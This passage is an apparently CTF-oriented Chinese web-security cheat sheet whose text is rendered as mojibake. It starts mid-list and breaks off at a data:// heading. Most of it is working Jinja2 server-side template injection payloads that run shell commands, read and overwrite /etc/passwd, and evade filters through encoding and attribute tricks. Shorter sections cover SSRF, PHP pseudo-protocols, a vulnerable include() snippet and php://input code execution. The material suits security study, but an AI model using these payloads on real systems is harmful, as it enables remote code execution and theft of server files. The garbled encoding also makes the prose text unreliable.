\#è°ƒç”¨osçš„popenæ‰§è¡Œå‘½ä»¤
\#python2ã€python3é€šç”¨
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
\#python3ä¸“å±
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}


\#è°ƒç”¨evalå‡½æ•°è¯»å–
\#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
{{"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}
\#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}} 
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
{{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


\#è°ƒç”¨ importlibç±»
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}


\#è°ƒç”¨linecacheå‡½æ•°
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


\#è°ƒç”¨communicate()å‡½æ•°
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}


\#å†™æ–‡ä»¶
å†™æ–‡ä»¶çš„è¯å°±ç›´æ¥æŠŠä¸Šé¢çš„æ„é€ é‡Œçš„read()æ¢æˆwrite()å³å¯ï¼Œä¸‹é¢ä¸¾ä¾‹åˆ©ç”¨fileç±»å°†æ•°æ®å†™å…¥æ–‡ä»¶ã€‚
{{"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')}}  ----python2çš„strç±»å‹ä¸ç›´æ¥ä»å±äºåŸºç±»ï¼Œæ‰€ä»¥payloadä¸­å«æœ‰ä¸¤ä¸ª .__bases__
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write('123456')}}


\#é€šç”¨ getshell
åŸç†ï¼šæ‰¾åˆ°å«æœ‰ __builtins__ çš„ç±»ï¼Œåˆ©ç”¨å³å¯ã€‚
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

```



#### å¸¸ç”¨çš„ç±»æ–¹æ³•

```
__class__ç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»

__bases__ç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œå°±æ˜¯çˆ¶ç±»ï¼ˆæˆ–è€…__base__ï¼‰

__mro__ï¼šæ˜¾ç¤ºç±»å’ŒåŸºç±»

__subclasses__()ï¼šæŸ¥çœ‹å½“å‰ç±»çš„å­ç±»

__getitem__ï¼šå¯¹æ•°ç»„å­—å…¸çš„å†…å®¹æå–

__init__  : åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function

__globals__:æŸ¥çœ‹å…¨å±€å˜é‡ï¼Œæœ‰å“ªäº›å¯ç”¨çš„å‡½æ•°æ–¹æ³•ç­‰ï¼Œç„¶åå†æœç´¢popenï¼Œevalç­‰

__builtins__:æä¾›å¯¹Pythonçš„æ‰€æœ‰"å†…ç½®"æ ‡è¯†ç¬¦çš„ç›´æ¥è®¿é—®,å³å…ˆåŠ è½½å†…åµŒå‡½æ•°å†è°ƒç”¨

__import__   ï¼š åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œç”¨äºå¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼ˆä¾‹å¦‚__import__('os').popen('ls').read()ï¼‰

url_for ï¼šflaskçš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__

lipsum ï¼šflaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}}

configï¼šå½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚

popen():æ‰§è¡Œä¸€ä¸ª shell ä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹

request.args.keyï¼šè·å–getä¼ å…¥çš„keyçš„å€¼

```

#### è¿‡æ»¤ç»•è¿‡

##### ç»•è¿‡[]

```
1ã€ä½¿ç”¨__getitem__ç»•è¿‡
{{().__class__.__bases__[0]}}
å¯æ›¿æ¢ä¸º
{{().__class__.__bases__.__getitem__(0)}}
```

##### ç»•è¿‡{{}}

```
{%print("".__class__)%}
```

æœ¬æ¥å¹¶æ— å›æ˜¾ï¼Œä½†æ˜¯åŠ ä¸ªprintå°±okäº†

##### ç»•è¿‡ç‚¹

###### ä½¿ç”¨ä¸­æ‹¬å·ç»•è¿‡ç‚¹

```
{{().__class__}} 
å¯æ›¿æ¢ä¸º:
{{()["__class__"]}}

ä¸¾ä¾‹ï¼š
{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}

```

###### ä½¿ç”¨attr()å‡½æ•°ç»•è¿‡ç‚¹

```
attr()å‡½æ•°æ˜¯Pythonå†…ç½®å‡½æ•°ä¹‹ä¸€ï¼Œç”¨äºè·å–å¯¹è±¡çš„å±æ€§å€¼æˆ–è®¾ç½®å±æ€§å€¼ã€‚å®ƒå¯ä»¥ç”¨äºä»»ä½•å…·æœ‰å±æ€§çš„å¯¹è±¡ï¼Œä¾‹å¦‚ç±»å®ä¾‹ã€æ¨¡å—ã€å‡½æ•°ç­‰ã€‚

{{().__class__}} 
å¯æ›¿æ¢ä¸ºï¼š
{{()|attr("__class__")}}
{{getattr('',"__class__")}}

ä¸¾ä¾‹ï¼š
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```

##### ç»•è¿‡ç‰¹æ®Šç¬¦å·

##### ï¼ˆå…¶ä»–ç±»ä¼¼/ä¹‹ç±»çš„éƒ½å¯ä»¥è¿™ä¹ˆå¼„ï¼Œå› ä¸ºæœ¬è´¨ä¸Šæ˜¯ç¼–ç ç»•è¿‡ï¼‰

###### requestç»•è¿‡

```
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd    
\#åˆ†æï¼š
request.args æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,è¿™é‡ŒæŠŠpathå½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ã€‚
è‹¥argsè¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨valuesæ¥æ¥å—GETæˆ–è€…POSTå‚æ•°ã€‚

å…¶å®ƒä¾‹å­ï¼š
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd

{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
post:arg1=open&arg2=/etc/passwd
```

###### chrç»•è¿‡

```
{% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}

æ³¨æ„ï¼šä½¿ç”¨GETè¯·æ±‚æ—¶ï¼Œ+å·éœ€è¦urlç¼–ç ï¼Œå¦åˆ™ä¼šè¢«å½“ä½œç©ºæ ¼å¤„ç†ã€‚
```

##### initç»•è¿‡

```
å¯ä»¥ç”¨__enter__æˆ–__exit__æ›¿ä»£__init__

{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
 
{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

```



##### ç»•è¿‡å…³é”®å­—

###### åˆ‡ç‰‡å°†é€†ç½®çš„å…³é”®å­—é¡ºåºè¾“å‡º

```
""["__cla""ss__"]
"".__getattribute__("__cla""ss__")
åè½¬
""["__ssalc__"][::-1]
"".__getattribute__("__ssalc__"[::-1])

```

###### +å·ç»•è¿‡

```
{{()['__cla'+'ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev'+'al']("__im"+"port__('o'+'s').po""pen('whoami').read()")}}
```

###### joinæ‹¼æ¥

```
åˆ©ç”¨joinï¼ˆï¼‰å‡½æ•°ç»•è¿‡å…³é”®å­—è¿‡æ»¤

{{[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()}}
```

###### å¼•å·ç»•è¿‡

```
_''_åŒæ ·ç­‰äº__
{{[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()}}
```

###### ä½¿ç”¨stråŸç”Ÿå‡½æ•°replaceæ›¿æ¢

```
å°†é¢å¤–çš„å­—ç¬¦æ‹¼æ¥è¿›åŸæœ¬çš„å…³é”®å­—é‡Œé¢ï¼Œç„¶ååˆ©ç”¨replaceå‡½æ•°å°†å…¶æ›¿æ¢ä¸ºç©ºã€‚

{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
```

###### asciiè½¬æ¢

```
å°†æ¯ä¸€ä¸ªå­—ç¬¦éƒ½è½¬æ¢ä¸ºasciiå€¼åå†æ‹¼æ¥åœ¨ä¸€èµ·ã€‚

"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

###### ç¼–ç ç»•è¿‡

```
16è¿›åˆ¶ç¼–ç ç»•è¿‡
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"

ä¾‹å­ï¼š
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen('whoami').read()}}
\
åŒç†ï¼Œä¹Ÿå¯ä½¿ç”¨å…«è¿›åˆ¶ç¼–ç ç»•è¿‡




base64ç¼–ç ç»•è¿‡
å¯¹äºpython2ï¼Œå¯åˆ©ç”¨base64è¿›è¡Œç»•è¿‡ï¼Œå¯¹äºpython3æ²¡æœ‰decodeæ–¹æ³•ï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚

"__class__"==("X19jbGFzc19f").decode("base64")

ä¾‹å­ï¼š
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}  
ç­‰ä»·äº  
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}




unicodeç¼–ç ç»•è¿‡
{%print((((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("os"))|attr("\u0070\u006f\u0070\u0065\u006e")("\u0074\u0061\u0063\u0020\u002f\u0066\u002a"))|attr("\u0072\u0065\u0061\u0064")())%}
ç­‰åŒäºlipsum.__globals__['os'].popen('tac /f*').read()




Hexç¼–ç ç»•è¿‡
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}   
ç­‰ä»·äº   
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

###### 

#### requestæ–¹æ³•ç»•è¿‡ï¼š

å¦‚æœå¯¹æˆ‘ä»¬ç‰¹å®šçš„å‚æ•°è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨requestæ¥è¿›è¡Œç»•è¿‡ï¼Œrequestå¯ä»¥è·å¾—è¯·æ±‚çš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬æ‹¿è¿‡æ»¤__class__ï¼Œå¯ä»¥ç”¨request.args.keyä¸”ä»¥GETæ–¹å¼æäº¤key=**class__æ¥æ›¿æ¢è¢«è¿‡æ»¤çš„__class**

```
request.args.key  #è·å–getä¼ å…¥çš„keyçš„å€¼

request.form.key  #è·å–postä¼ å…¥å‚æ•°(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)

reguest.values.key  #è·å–æ‰€æœ‰å‚æ•°ï¼Œå¦‚æœgetå’Œpostæœ‰åŒä¸€ä¸ªå‚æ•°ï¼Œpostçš„å‚æ•°ä¼šè¦†ç›–get

request.cookies.key  #è·å–cookiesä¼ å…¥å‚æ•°

request.headers.key  #è·å–è¯·æ±‚å¤´è¯·æ±‚å‚æ•°

request.data  #è·å–postä¼ å…¥å‚æ•°(Content-Type:a/b)

request.json  #è·å–postä¼ å…¥jsonå‚æ•° (Content-Type: application/json)

```

### SSRF

#### SSRFæ¦‚å¿µ

æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚

ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ(æ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡ ç«¯èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ)ã€‚

å¾ˆå¤šWebåº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ã€‚

ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼ŒWebåº”ç”¨å¯ä»¥è·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚

/etc/passwd
æ—¥å¿—æ–‡ä»¶
é…ç½®æ–‡ä»¶

è¿™ä¸ªåŠŸèƒ½å¦‚æœè¢«æ¶æ„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°æœåŠ¡å™¨ã€‚
ç”±äºæœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†æ˜¯åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼çš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»ä½•çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚

##### ä¾‹å¦‚ï¼š

```
Aç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªæ‰€æœ‰äººéƒ½å¯ä»¥è®¿é—®çš„å¤–ç½‘ç½‘ç«™ï¼Œ
Bç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªä»–ä»¬å†…éƒ¨çš„OAç½‘ç«™ã€‚

æ‰€ä»¥ï¼Œæˆ‘ä»¬æ™®é€šç”¨æˆ·åªå¯ä»¥è®¿é—®Aç½‘ç«™ï¼Œä¸èƒ½è®¿é—®Bç½‘ç«™ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åŒè¿‡Aç½‘ç«™åšè·³æ¿ï¼Œè®¿é—®Bç½‘ç«™ï¼Œä»
è€Œè¾¾åˆ°æ”»å‡»bç½‘ç«™éœ€æ±‚ã€‚
```

?image=192.168.1.*
è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„æ²¡æœ‰è¿‡æ»¤çš„

 #### SSRFåŸç†è§£æ

 URLæ„é€ å¦‚ä¸‹

```
URI=scheme:[//authority]path[?query][#fragment]
```

å…¶ä¸­authorityæ–‡ä»¶åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†

```
[userinfo@]hoost[:port]
```

##### ç»„æˆæ„é€ è¯¦è§£

| è¯­æ³•å†…å®¹  | è¯¦æƒ…                                                         |
| :-------: | :----------------------------------------------------------- |
|  schema   | ç”±ä¸€ä¸²***å¤§å°å†™ä¸æ•æ„Ÿ***çš„å­—ç¬¦ç»„æˆï¼Œè¡¨ç¤ºè·å–èµ„æºæ‰€éœ€è¦çš„åè®® |
|           | userinfoï¼šè¿™ä¸ªé‡åˆ°å¾—æ¯”è¾ƒå°‘ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯é€‰é¡¹ï¼Œå¦‚æœéœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ ¼å¼ä¸º[username:password@]ï¼Œä»¥ç»“å°¾ |
| authority | hostï¼šè¡¨ç¤ºåœ¨å“ªä¸ªæœåŠ¡å™¨ä¸Šè·å–èµ„æº                             |
|           | portï¼šæœåŠ¡å™¨ç«¯å£ã€‚***ä½¿ç”¨é»˜è®¤ç«¯å£æ—¶å¯ä»¥çœç•¥***               |
|   path    | æŒ‡å‘èµ„æºçš„è·¯å¾„ï¼Œä¸€èˆ¬ç”¨/æ¥åˆ†å‰²                                |
|   query   | æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå°†è¾“å…¥æ•°æ®ä¼ é€’ç»™æœåŠ¡å™¨ç«¯ï¼Œå¦‚ï¼šå‘æœåŠ¡å™¨ä¼ è¾“ç”¨æˆ·åå’Œå¯†ç  |
| fragment  | å…¶å†…å®¹ä¸ä¼šä¼ åˆ°æœåŠ¡ç«¯ï¼Œä¸€èˆ¬ç”¨äºè¡¨ç¤ºé¡µé¢çš„é”šç‚¹                 |

##### åŸç†è§£æ

å¦‚æœURLå‚æ•°ä¸ºä¸€ä¸ªå›¾ç‰‡çš„åœ°å€ï¼Œé‚£ä¹ˆå°†ç›´æ¥æ‰“å°è¯¥å›¾ç‰‡

ä½†æ˜¯å› ä¸ºè·å–å›¾ç‰‡åœ°å€çš„URLå‚æ•°æœªè¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åœ°å€æˆ–è€…åè®®æ¥å‘èµ·ssrfæ”»å‡»

***ä¾‹å¦‚***    å°†urlçš„è¯·æ±‚æ”¹ä¸ºfile://ect/password,ä½¿ç”¨fileåè®®è¯»å–

#### SSRFçš„åˆ©ç”¨ï¼š

ä¸»è¦æ¶‰åŠå‡½æ•°ï¼š

```
file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚

readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚

fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚

curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚

fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URLã€‚
```

1ã€httpåè®®è¿›è¡Œå†…ç½‘çš„ipæ‰«æã€ç«¯å£æ¢æµ‹

å…ˆå»æ¢æµ‹å†…ç½‘æœ‰å“ªäº›ä¸»æœºï¼Œå¼€æ”¾äº†å“ªäº›ç«¯å£
ä¸€ä¸ªIPå°±ä»£è¡¨ä¸€å°æœåŠ¡å™¨ï¼Œä¸»æœº
2ã€fileåè®®è¿›è¡Œæœ¬åœ°æ–‡ä»¶çš„è¯»å–

çŸ¥é“ä¸€äº›æ•æ„Ÿæ–‡ä»¶çš„ä½ç½®

etc/passwd

my.ini, my.cnf ï¼ˆæ•°æ®åº“é…ç½®æ–‡ä»¶
config

phpé…ç½®æ–‡ä»¶

apacheçš„é…ç½®æ–‡ä»¶

##### phpå‡½æ•°åˆ©ç”¨SSRF

file_get_contents()å‡½æ•°

```
file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚

è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚
```

### PHPä¼ªåè®®

PHPæ”¯æŒçš„ä¼ªåè®®ï¼š

```
1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
2 http:// â€” è®¿é—® HTTP(s) ç½‘å€
3 ftp:// â€” è®¿é—® FTP(s) URLs
4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰
5 zlib:// â€” å‹ç¼©æµ
6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰
7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼
8 phar:// â€” PHP å½’æ¡£
9 ssh2:// â€” Secure Shell 2
10 rar:// â€” RAR
11 ogg:// â€” éŸ³é¢‘æµ
12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ
```

åœ¨CTFä¸­ï¼Œç»å¸¸ä½¿ç”¨`file://`ã€`php://`ã€`data://`ä¸‰ç§ä¼ªåè®®æ­é…ä¸åŒç¯å¢ƒæ¥è€ƒæŸ¥é€‰æ‰‹å¯¹è¿™ä¸€çŸ¥è¯†çš„æŒæ¡ï¼Œå…¶ä¸­ï¼Œæ¯ä¸€ç§åè®®ç”±å®ƒä»¬å„è‡ªçš„åè®®å¤´å’Œè½¬æ¢å™¨æ„æˆï¼Œé€šè¿‡æ‹¼æ¥çš„æ–¹å¼å‘Šè¯‰æœåŠ¡å™¨ç”¨æˆ·ä¼ å…¥ä»€ä¹ˆåè®®ç±»å‹çš„çš„æ•°æ®ï¼Œæ•°æ®è¯¥å¦‚ä½•å»è§£æã€‚ä¾‹å¦‚ï¼š

#### fill://åè®®

ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼Œè¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œ***ä¸”ä¸å—`allow_url_fopen`ä¸`allow_url_include`è®¾ç½®çš„å½±å“***ï¼Œå½“ä¸æŒ‡å®šéœ€è¦åŠå‡½æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æ—¶ï¼Œé»˜è®¤ä¸ºè¯¥è„šæœ¬å­˜åœ¨çš„è·¯å¾„

```
<?php
$file = $_GET['file'];
if ($file){
	echo $file,"<br/>";
	include($file);
}
?>
```

å½“åŒ…å«æŒ‡å®šçš„flag.phpæ–‡ä»¶ï¼Œä¼ å…¥?file=flag.phpï¼Œè‹¥å†…å®¹ä¸ºook!ï¼Œåˆ™è¿”å›

```
flag.php
oko!

```

å½“ä¼ å…¥ç»å¯¹è·¯å¾„ç»å¯¹è·¯å¾„æ—¶ï¼Œç›´æ¥ä»è·¯å¾„ä¸­å¯»æ‰¾ï¼Œå¦‚file=D:\phpStudy\WWW\flag.phpï¼Œåˆ™è¿”å›

```
D:\\phpStudy\\WWW\\flag.php
ook!
```

#### php://åè®®

php://ä¸‹çš„åè®®å¾ˆå¤šï¼Œæœ€å¸¸è§çš„ä¸ºphp://filterå’Œphp://input

filterç”¨äºè¯»å–æ–‡ä»¶æºç ï¼Œä¸€èˆ¬å°†ç»“æœè¿›è¡Œ***base64åŠ å¯†***

inputåˆ™ç”¨äº***å°†è¾“å…¥å½“ä½œPHPä»£ç æ‰§è¡Œ***



##### php://filteråŸºæœ¬æ ¼å¼

```
åè®®å¤´(php://filter)+/read(write)=è¿‡æ»¤å™¨ï¼ˆå¯é€‰ï¼‰+/resource=æ–‡ä»¶åï¼ˆå¿…é¡»ï¼‰
```

```
  å¸¸è§è¿‡æ»¤å™¨ï¼š
  string.rot13	ç­‰åŒstr_rot13()ï¼Œrot13å˜æ¢
  string.toupper	 ç­‰åŒstr_toupper()ï¼Œè½¬å¤§å†™
  string.tolower	ç­‰åŒstr_tolower()ï¼Œè½¬å°å†™
  string.strip_tags	ç­‰åŒstrip_tags()ï¼Œå»å¤„htmlã€phpæ ‡ç­¾
  convert.base64-encode&convert.base64-decode	  ç­‰åŒbase64_encode()å’Œbase64_decode()ï¼Œbase64ç¼–ç è§£ç 
  convert.quoted-printable-encode & convert.quoted-printable-decode	 quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç 
```

  ***ä¸¾ä¾‹***

```
ç›´æ¥è¯»æ–‡ä»¶ï¼šphp://filter/resourse=flag.php
åŠ å¯†æ–‡ä»¶å†…å®¹ï¼šphp://filter/read=convert.base64-encode/resource=flag.php
```

##### php://inputåè®®

è¯¥åè®®å¯ä»¥è®¿é—®è¯·æ±‚çš„è¯·æ±‚æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ç½®ä¸ºphp://inputï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpä»£ç æ‰§è¡Œæ—¶ä¼š***å°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹***

```
?file=php://input
POST: <?php system('ls');?>
```

#### data://åè®®

